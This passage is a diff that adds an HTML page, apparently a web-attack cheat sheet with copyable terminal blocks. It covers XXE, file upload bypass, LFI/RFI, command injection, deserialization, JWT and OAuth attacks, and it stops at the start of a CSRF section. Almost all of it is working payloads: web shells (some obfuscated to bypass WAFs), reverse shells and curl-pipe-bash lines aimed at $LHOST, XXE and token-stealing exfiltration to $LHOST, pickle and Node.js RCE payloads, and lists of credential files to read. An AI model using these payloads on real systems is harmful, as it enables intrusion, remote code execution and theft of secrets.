+        &lt;!ENTITY % eval "&lt;!ENTITY &amp;<span class="cm">#x25; exfil SYSTEM
+          'http://$LHOST/?f=%file;'&gt;"&gt;</span>
+        %eval;
+        %exfil;
+        EOF
+
+        <span class="cm"># XXE payload pointing to your DTD</span>
+        &lt;?xml version="1.0"?&gt;
+        &lt;!DOCTYPE foo [&lt;!ENTITY % remote SYSTEM "http://$LHOST/xxe.dtd"&gt; %remote;]&gt;
+        &lt;root&gt;&lt;data&gt;test&lt;/data&gt;&lt;/root&gt;
+      </div>
+    </div>
+    <h3 class="md-h3" id="xxe-via-file-uploads">XXE via File Uploads</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># SVG file XXE</span>
+        cat &gt; xxe.svg &lt;&lt; 'EOF'
+        &lt;?xml version="1.0" standalone="yes"?&gt;
+        &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+        &lt;svg xmlns="http://www.w3.org/2000/svg" width="500" height="500"&gt;
+        &lt;text y="20"&gt;&amp;xxe;&lt;/text&gt;
+        &lt;/svg&gt;
+        EOF
+
+        <span class="cm"># Upload xxe.svg, then view the image — file content rendered as text</span>
+
+        <span class="cm"># DOCX/XLSX XXE</span>
+        <span class="cm"># These are ZIP archives. Modify word/document.xml to add XXE, rezip.</span>
+        mkdir docx &amp;&amp; cd docx
+        cp ../file.docx .
+        unzip file.docx
+        <span class="cm"># Edit word/document.xml — add XXE entity at top</span>
+        zip -r ../malicious.docx .
+      </div>
+    </div>
+    <h3 class="md-h3" id="xxe-in-json-xml-conversion">XXE in JSON → XML Conversion</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># If app converts JSON to XML internally</span>
+        <span class="cm"># Change Content-Type: application/json → text/xml</span>
+        <span class="cm"># Resend with XML body containing XXE</span>
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a10-file-upload-attacks" style="margin-top:36px"><span class="sec-title">A10 — File Upload
+        Attacks</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="extension-bypass">Extension Bypass</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># PHP variants (try all)</span>
+        shell.php shell.php3 shell.php4 shell.php5 shell.php7 shell.php8
+        shell.phtml shell.phtm shell.phar shell.phpt shell.pgif
+        shell.shtml shell.cgi
+
+        <span class="cm"># Case bypass</span>
+        shell.pHp shell.PHP shell.PhP
+
+        <span class="cm"># Double extension</span>
+        shell.jpg.php shell.php.jpg shell.php.gif
+
+        <span class="cm"># Special characters</span>
+        shell.php%00.jpg <span class="cm"># null byte (PHP &lt; 5.5)</span>
+        shell.php%20 <span class="cm"># space</span>
+        shell.php. <span class="cm"># trailing dot (Windows)</span>
+        shell.php::$DATA <span class="cm"># Windows ADS</span>
+
+        <span class="cm"># ASP/ASPX</span>
+        shell.asp shell.aspx shell.asa shell.ashx shell.asmx shell.cer shell.soap
+
+        <span class="cm"># JSP</span>
+        shell.jsp shell.jspx shell.jsw shell.jsv shell.jspf shell.jtml
+
+        <span class="cm"># Other interpreted</span>
+        shell.pl shell.py shell.rb shell.sh shell.cgi
+      </div>
+    </div>
+    <h3 class="md-h3" id="magic-bytes-mime-bypass">Magic Bytes & MIME Bypass</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Add magic bytes to bypass file type checks</span>
+        <span class="cm"># GIF + PHP</span>
+        printf 'GIF89a&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php.gif
+        printf 'GIF89a;\n&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.gif.php
+
+        <span class="cm"># JPEG + PHP</span>
+        printf '\xff\xd8\xff\xe0&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.jpg.php
+
+        <span class="cm"># PNG + PHP</span>
+        printf '\x89PNG\r\n\x1a\n&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.png.php
+
+        <span class="cm"># MIME type manipulation in Burp</span>
+        <span class="cm"># Change: Content-Type: application/x-php</span>
+        <span class="cm"># To: Content-Type: image/jpeg</span>
+
+        <span class="cm"># exiftool — embed PHP in image metadata</span>
+        exiftool -Comment='&lt;?php system($_GET["cmd"]); ?&gt;' image.jpg -o shell.jpg.php
+      </div>
+    </div>
+    <h3 class="md-h3" id="htaccess-upload">.htaccess Upload</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># If you can upload to a writable directory with Apache:</span>
+        <span class="cm"># Upload a malicious .htaccess:</span>
+        echo 'AddType application/x-httpd-php .jpg' &gt; .htaccess
+        <span class="cm"># Now any .jpg in that directory executes as PHP</span>
+        <span class="cm"># Upload shell.jpg:</span>
+        echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.jpg
+      </div>
+    </div>
+    <h3 class="md-h3" id="web-shells-reference">Web Shells Reference</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">php</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># PHP</span>
+        &lt;?php system($_GET['cmd']); ?&gt;
+        &lt;?php echo shell_exec($_GET['cmd']); ?&gt;
+        &lt;?php passthru($_GET['cmd']); ?&gt;
+        &lt;?php eval($_POST['cmd']); ?&gt;
+        &lt;?php echo exec($_GET['cmd']); ?&gt;
+
+        <span class="cm"># PHP one-liner with output</span>
+        &lt;?php echo "&lt;pre&gt;".shell_exec($_GET['cmd'])."&lt;/pre&gt;"; ?&gt;
+
+        <span class="cm"># Obfuscated PHP (WAF bypass)</span>
+        &lt;?php $f='sys'.'tem';$f($_GET['cmd']); ?&gt;
+        &lt;?php ${"\x47\x4c\x4f\x42\x41\x4c\x53"}['c']($_GET['c']); ?&gt;
+
+        <span class="cm"># ASP</span>
+        &lt;% Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()) %&gt;
+
+        <span class="cm"># ASPX</span>
+        &lt;%@ Page Language="C<span class="cm">#" %&gt;</span>
+        &lt;% System.Diagnostics.Process p = new System.Diagnostics.Process();
+        p.StartInfo.FileName = "cmd.exe";
+        p.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
+        p.StartInfo.UseShellExecute = false;
+        p.StartInfo.RedirectStandardOutput = true;
+        p.Start();
+        Response.Write("&lt;pre&gt;" + p.StandardOutput.ReadToEnd() + "&lt;/pre&gt;"); %&gt;
+
+        <span class="cm"># JSP</span>
+        &lt;% Runtime rt = Runtime.getRuntime();
+        String[] commands = {"bash", "-c", request.getParameter("cmd")};
+        Process proc = rt.exec(commands);
+        java.io.InputStream is = proc.getInputStream();
+        java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
+        out.print("&lt;pre&gt;" + (s.hasNext() ? s.next() : "") + "&lt;/pre&gt;"); %&gt;
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a11-lfi-path-traversal-rfi" style="margin-top:36px"><span class="sec-title">A11 — LFI /
+        Path Traversal / RFI</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="path-traversal-payloads">Path Traversal Payloads</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Basic</span>
+        ../../../etc/passwd
+        ..%2F..%2F..%2Fetc%2Fpasswd
+        %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+        ..%252f..%252f..%252fetc%252fpasswd <span class="cm"># double encoded</span>
+
+        <span class="cm"># Filter bypass</span>
+        ....//....//....//etc/passwd <span class="cm"># filter strips ../</span>
+        ..././..././..././etc/passwd <span class="cm"># filter strips ../</span>
+        /etc/passwd <span class="cm"># absolute path</span>
+        ..%c0%af..%c0%af..%c0%afetc%c0%afpasswd <span class="cm"># unicode</span>
+
+        <span class="cm"># Null byte (PHP &lt; 5.5)</span>
+        ../../../etc/passwd%00
+
+        <span class="cm"># Windows</span>
+        ..\..\..\windows\system32\drivers\etc\hosts
+        ..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
+        %2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cwin.ini
+
+        <span class="cm"># Common files to read — Linux</span>
+        /etc/passwd
+        /etc/shadow
+        /etc/hosts
+        /etc/hostname
+        /etc/os-release
+        /proc/self/environ
+        /proc/self/cmdline
+        /proc/self/maps
+        /proc/net/tcp
+        /var/log/apache2/access.log
+        /var/log/apache2/error.log
+        /var/log/auth.log
+        /var/log/nginx/access.log
+        /var/log/nginx/error.log
+        /home/user/.bash_history
+        /home/user/.ssh/id_rsa
+        /root/.ssh/id_rsa
+        /var/www/html/config.php
+        /var/www/html/.env
+        /etc/nginx/nginx.conf
+        /etc/apache2/apache2.conf
+        /etc/apache2/sites-enabled/000-default.conf
+
+        <span class="cm"># Common files — Windows</span>
+        C:\windows\system32\drivers\etc\hosts
+        C:\windows\win.ini
+        C:\windows\system.ini
+        C:\Users\Administrator\Desktop\root.txt
+        C:\inetpub\wwwroot\web.config
+        C:\windows\PHP\php.ini
+      </div>
+    </div>
+    <h3 class="md-h3" id="lfi-to-rce">LFI to RCE</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Log poisoning (Apache access log)</span>
+        <span class="cm"># 1. Poison the log via User-Agent or URL</span>
+        curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;" $URL
+        <span class="cm"># 2. Include the log via LFI</span>
+        curl "$URL/page.php?file=/var/log/apache2/access.log&amp;cmd=id"
+
+        <span class="cm"># Log poisoning via SSH</span>
+        ssh '&lt;?php system($_GET["cmd"]); ?&gt;'@$IP <span class="cm"># username as PHP code</span>
+        <span class="cm"># Then include /var/log/auth.log</span>
+
+        <span class="cm"># Log poisoning via SMTP</span>
+        telnet $IP 25
+        EHLO
+        MAIL FROM: &lt;?php system($_GET['cmd']); ?&gt;
+        <span class="cm"># Then include /var/log/mail.log</span>
+
+        <span class="cm"># /proc/self/environ (requires PHP-CGI or specific config)</span>
+        curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;" "$URL"
+        curl "$URL/page.php?file=/proc/self/environ&amp;cmd=id"
+
+        <span class="cm"># PHP session file poisoning</span>
+        <span class="cm"># 1. Find session parameter</span>
+        <span class="cm"># 2. Inject PHP code into session value</span>
+        curl "$URL/page.php?param=&lt;?php system(\$_GET['cmd']); ?&gt;"
+        <span class="cm"># 3. Include session file</span>
+        curl "$URL/page.php?file=/var/lib/php/sessions/sess_SESSIONID&amp;cmd=id"
+
+        <span class="cm"># PHP wrappers</span>
+        <span class="cm"># Read file as base64</span>
+        curl "$URL/page.php?file=php://filter/convert.base64-encode/resource=config.php"
+        echo "BASE64" | base64 -d
+
+        <span class="cm"># Zip wrapper</span>
+        <span class="cm"># 1. Create zip with PHP file</span>
+        echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php
+        zip shell.zip shell.php
+        <span class="cm"># 2. Upload zip, then include</span>
+        curl "$URL/page.php?file=zip:///var/www/html/uploads/shell.zip%23shell"
+
+        <span class="cm"># data:// wrapper (direct PHP execution)</span>
+        curl "$URL/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
+        <span class="cm"># (base64 of: &lt;?php system($_GET['cmd']); ?&gt;)</span>
+
+        <span class="cm"># expect:// wrapper</span>
+        curl "$URL/page.php?file=expect://id"
+
+        <span class="cm"># phar:// wrapper</span>
+        <span class="cm"># 1. Create PHAR</span>
+        php -r "\$p=new Phar('shell.phar'); \$p-&gt;startBuffering(); \$p-&gt;addFromString('shell.php','&lt;?php
+        system(\$_GET[\"cmd\"]); ?&gt;'); \$p-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;');
+        \$p-&gt;stopBuffering();"
+        <span class="cm"># 2. Include via phar wrapper</span>
+        curl "$URL/page.php?file=phar:///var/www/html/uploads/shell.phar/shell.php&amp;cmd=id"
+      </div>
+    </div>
+    <h3 class="md-h3" id="rfi-remote-file-inclusion">RFI (Remote File Inclusion)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Only works if allow_url_include = On in php.ini</span>
+        <span class="cm"># Check: look for php.ini or phpinfo() page</span>
+
+        <span class="cm"># Host malicious file</span>
+        python3 -m http.server 80
+        echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.txt
+
+        <span class="cm"># Include remotely</span>
+        curl "$URL/page.php?file=http://$LHOST/shell.txt&amp;cmd=id"
+        curl "$URL/page.php?file=http://$LHOST/shell.txt%00" <span class="cm"># null byte bypass</span>
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a12-command-injection" style="margin-top:36px"><span class="sec-title">A12 — Command
+        Injection</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="detection-payloads">Detection Payloads</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Concatenate with OS command</span>
+        ; id
+        &amp;&amp; id
+        || id
+        | id
+        `id`
+        $(id)
+
+        <span class="cm"># Newline</span>
+        %0a id
+        %0a%0d id
+
+        <span class="cm"># Blind — time-based</span>
+        ; sleep 5
+        &amp;&amp; sleep 5
+        | sleep 5
+        $(sleep 5)
+        `sleep 5`
+
+        <span class="cm"># Blind — OOB</span>
+        ; curl http://$LHOST/
+        ; ping -c 1 $LHOST
+        ; nslookup $LHOST
+        $(curl http://$LHOST/)
+      </div>
+    </div>
+    <h3 class="md-h3" id="filter-bypass">Filter Bypass</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Space bypass</span>
+        ${IFS} <span class="cm"># instead of space</span>
+        $IFS <span class="cm"># same</span>
+        {id} <span class="cm"># braces</span>
+        id&lt;&gt;/dev/null <span class="cm"># redirect</span>
+
+        <span class="cm"># Using brace expansion</span>
+        {cat,/etc/passwd}
+
+        <span class="cm"># $() variable</span>
+        a=$(id);echo$IFS$a
+
+        <span class="cm"># Slash bypass</span>
+        ${HOME:0:1} <span class="cm"># / (first char of /root)</span>
+        echo${IFS}${HOME:0:1}etc${HOME:0:1}passwd | xargs cat
+
+        <span class="cm"># Quote bypass</span>
+        c'a't /etc/passwd
+        c"a"t /etc/passwd
+
+        <span class="cm"># Wildcard</span>
+        cat /etc/pass*
+        cat /etc/passwd → cat /et?/pas?wd
+
+        <span class="cm"># Encoding bypass</span>
+        echo 'cat /etc/passwd' | base64
+        $(echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d)
+
+        <span class="cm"># Blacklist bypass</span>
+        l''s /etc/passwd <span class="cm"># single quotes in command</span>
+        c\at /etc/passwd <span class="cm"># escaped char</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="reverse-shell-via-command-injection">Reverse Shell via Command Injection</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Bash</span>
+        ;bash -c 'bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1'
+
+        <span class="cm"># URL encoded (for web parameters)</span>
+        ;bash%20-c%20'bash%20-i%20&gt;%26%20/dev/tcp/$LHOST/$LPORT%200&gt;%261'
+
+        <span class="cm"># Python</span>
+        ;python3 -c 'import
+        socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import
+        pty;pty.spawn("/bin/bash")'
+
+        <span class="cm"># Curl to pipe</span>
+        ;curl http://$LHOST/shell.sh | bash
+        ;wget -qO- http://$LHOST/shell.sh | bash
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a13-insecure-deserialization" style="margin-top:36px"><span class="sec-title">A13 —
+        Insecure Deserialization</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="php-deserialization">PHP Deserialization</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Detect: look for serialized data in cookies/params</span>
+        <span class="cm"># O:8:"UserData":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}</span>
+        <span class="cm"># a:2:{s:4:"user";s:5:"admin";s:6:"loggedin";b:1;}</span>
+
+        <span class="cm"># PHP POP chain tools</span>
+        <span class="cm"># phpggc — PHP generic gadget chains</span>
+        phpggc -l <span class="cm"># list available gadgets</span>
+        phpggc Laravel/RCE1 system 'id'
+        phpggc Symfony/RCE4 system 'id'
+        phpggc Laravel/RCE1 system 'id' -b <span class="cm"># base64</span>
+        phpggc Laravel/RCE1 system 'id' -u <span class="cm"># URL encode</span>
+        phpggc -s Monolog/RCE1 system 'id' <span class="cm"># serialize</span>
+
+        <span class="cm"># Check /vendor/composer/installed.json for frameworks/libraries</span>
+
+        <span class="cm"># Manual PHP object injection</span>
+        <span class="cm"># Identify class name, find __wakeup() or __destruct() methods</span>
+        <span class="cm"># Craft serialized object with malicious property values</span>
+
+        <span class="cm"># Example — simple property manipulation</span>
+        <span class="cm"># Original: O:4:"User":1:{s:4:"role";s:4:"user";}</span>
+        <span class="cm"># Modified: O:4:"User":1:{s:4:"role";s:5:"admin";}</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="java-deserialization">Java Deserialization</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Detect: base64 blob starting with rO0AB or raw bytes \xac\xed</span>
+        echo "rO0ABX..." | base64 -d | xxd | head <span class="cm"># look for ac ed 00 05</span>
+
+        <span class="cm"># ysoserial — Java gadget chains</span>
+        java -jar ysoserial.jar CommonsCollections1 'id' &gt; payload.bin
+        java -jar ysoserial.jar CommonsCollections6 'id' &gt; payload.bin
+        java -jar ysoserial.jar URLDNS "http://$LHOST/" &gt; payload.bin <span class="cm"># blind detection</span>
+        java -jar ysoserial.jar Spring1 'id' &gt; payload.bin
+
+        <span class="cm"># Available gadgets (depends on libraries on target):</span>
+        <span class="cm"># CommonsCollections1-7, Spring1-2, Groovy1, Jdk7u21, URLDNS, JRMPClient</span>
+
+        <span class="cm"># Send payload in cookie / parameter</span>
+        <span class="cm"># If cookie: base64 encode the binary payload</span>
+        base64 -w 0 payload.bin
+
+        <span class="cm"># Reverse shell payload</span>
+        java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,BASE64_REVSHELL}|{base64,-d}|bash' &gt; payload.bin
+      </div>
+    </div>
+    <h3 class="md-h3" id="python-pickle">Python Pickle</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">python</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Detect: look for cookie/param starting with gASV... or
+          \x80\x04\x95</span>
+        import pickle, base64
+
+        class Exploit(object):
+        def __reduce__(self):
+        import os
+        return (os.system, ('bash -c "bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1"',))
+
+        payload = base64.b64encode(pickle.dumps(Exploit()))
+        print(payload)
+        <span class="cm"># Send payload as pickle data</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="nodejs-deserialization">Node.js Deserialization</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">javascript</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">// node-serialize package vulnerability
+        // Detect: JSON with IIFE patterns
+        {"rce":"_$$ND_FUNC$$_function(){return require('child_process').exec('id')}()"}
+
+        // Reverse shell
+        {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \"bash -i &gt;&amp;
+        /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1\"')}()"}</div>
+    </div>
+    <h3 class="md-h3" id="net-deserialization">.NET Deserialization</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Tools</span>
+        <span class="cm"># ysoserial.net (Windows)</span>
+        ysoserial.exe -g ObjectDataProvider -f Json.Net -c "whoami" -o base64
+        ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "whoami" -o base64
+
+        <span class="cm"># Detect ViewState tampering — if __VIEWSTATE not HMAC protected</span>
+        <span class="cm"># BurpSuite extension: ViewState Editor</span>
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a14-jwt-attacks" style="margin-top:36px"><span class="sec-title">A14 — JWT
+        Attacks</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="jwt-structure">JWT Structure</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">HEADER.PAYLOAD.SIGNATURE
+        eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE</div>
+    </div>
+    <h3 class="md-h3" id="jwt-attacks">JWT Attacks</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Decode JWT (no verification)</span>
+        echo "PAYLOAD_B64" | base64 -d
+        <span class="cm"># Or: jwt_tool token.txt</span>
+
+        <span class="cm"># Tool: jwt_tool</span>
+        pip3 install jwt_tool
+        jwt_tool eyJ... <span class="cm"># decode</span>
+        jwt_tool eyJ... -T <span class="cm"># tamper mode</span>
+        jwt_tool eyJ... -X a <span class="cm"># algorithm confusion attack</span>
+        jwt_tool eyJ... -X n <span class="cm"># none algorithm attack</span>
+
+        <span class="cm"># Attack 1: Algorithm = None (remove signature)</span>
+        <span class="cm"># Change "alg":"HS256" to "alg":"none"</span>
+        <span class="cm"># Remove the signature part (keep trailing dot)</span>
+        <span class="cm"># HEADER: {"alg":"none","typ":"JWT"}</span>
+        <span class="cm"># Payload: {"user":"admin","role":"admin"}</span>
+        <span class="cm"># Token: base64(header).base64(payload). ← empty signature</span>
+
+        python3 - &lt;&lt; 'EOF'
+        import base64, json
+        header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
+        payload = base64.b64encode(json.dumps({"user":"admin","role":"admin"}).encode()).rstrip(b'=').decode()
+        print(f"{header}.{payload}.")
+        EOF
+
+        <span class="cm"># Attack 2: Weak secret brute force</span>
+        hashcat -a 0 -m 16500 "eyJ..." /usr/share/wordlists/rockyou.txt
+        jwt_tool eyJ... -C -d /usr/share/wordlists/rockyou.txt
+
+        <span class="cm"># Attack 3: RS256 → HS256 confusion</span>
+        <span class="cm"># If server uses RS256 (asymmetric), get the PUBLIC key</span>
+        <span class="cm"># Change alg to HS256, sign with public key (HMAC with public key as secret)</span>
+        jwt_tool eyJ... -X k -pk public.pem
+
+        <span class="cm"># Attack 4: JWK injection (embed your own key)</span>
+        <span class="cm"># Generate RSA key, embed public key in JWT header as JWK</span>
+        jwt_tool eyJ... -X i
+
+        <span class="cm"># Attack 5: JKU header injection (point to your own JWKS)</span>
+        <span class="cm"># Host a JWKS JSON on your server</span>
+        jwt_tool eyJ... -X s -ju "http://$LHOST/jwks.json"
+
+        <span class="cm"># Attack 6: KID header injection</span>
+        <span class="cm"># Kid parameter used in file path → LFI</span>
+        <span class="cm"># "kid": "../../../dev/null" → sign with empty string</span>
+        <span class="cm"># "kid": "../../etc/passwd" → sign with passwd content</span>
+
+        <span class="cm"># Attack 7: Payload claim manipulation</span>
+        <span class="cm"># Change: "role":"user" → "role":"admin"</span>
+        <span class="cm"># Change: "sub":"user1" → "sub":"admin"</span>
+        <span class="cm"># Change: "is_admin":false → "is_admin":true</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="jwt-forge-with-known-secret">JWT Forge with Known Secret</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">python</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">import jwt
+        secret = "secret123"
+        payload = {"user": "admin", "role": "admin"}
+        token = jwt.encode(payload, secret, algorithm="HS256")
+        print(token)</div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a15-oauth-oidc-attacks" style="margin-top:36px"><span class="sec-title">A15 — OAuth & OIDC
+        Attacks</span><span class="sec-line"></span></div>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># OAuth flow:</span>
+        <span class="cm"># 1. Client requests authorization → redirect to auth server with client_id, redirect_uri,
+          scope, state</span>
+        <span class="cm"># 2. User grants access → auth server redirects to redirect_uri with code</span>
+        <span class="cm"># 3. Client exchanges code for token via POST</span>
+
+        <span class="cm"># Attack 1: redirect_uri manipulation (steal auth code)</span>
+        <span class="cm"># If redirect_uri validation is weak:</span>
+        /callback?redirect_uri=https://attacker.com/callback
+        /callback?redirect_uri=https://legitimate.com/../../../attacker.com
+        /callback?redirect_uri=https://legitimate.com.attacker.com
+
+        <span class="cm"># Attack 2: state parameter missing → CSRF</span>
+        <span class="cm"># If no state, craft auth URL → victim clicks → you get their token</span>
+
+        <span class="cm"># Attack 3: Authorization code interception</span>
+        <span class="cm"># If code delivered via Referer header (page has external content)</span>
+        <span class="cm"># Or if redirect goes to HTTP (code in URL → logged)</span>
+
+        <span class="cm"># Attack 4: openid scope → profile takeover</span>
+        <span class="cm"># Request: scope=openid%20profile%20email</span>
+        <span class="cm"># Sub claim manipulation — if sub not properly validated</span>
+
+        <span class="cm"># Attack 5: token leakage via Referer</span>
+        <span class="cm"># If access token in URL and page has external resources</span>
+
+        <span class="cm"># Attack 6: client_secret exposure</span>
+        <span class="cm"># Check JS files, mobile apps, GitHub for client_secret</span>
+        grep -r "client_secret" *.js
+
+        <span class="cm"># Attack 7: implicit flow token theft (fragment hash)</span>
+        <span class="cm"># Inject code to steal access_token from URL fragment</span>
+        &lt;script&gt;document.location='http://$LHOST/?tok='+location.hash.slice(1)&lt;/script&gt;
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a16-csrf" style="margin-top:36px"><span class="sec-title">A16 — CSRF</span><span
+        class="sec-line"></span></div>
+    <h3 class="md-h3" id="detection">Detection</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Check if CSRF token:</span>
+        <span class="cm"># 1. Is present in form</span>
+        <span class="cm"># 2. Is validated server-side</span>
+        <span class="cm"># 3. Is tied to user session</span>
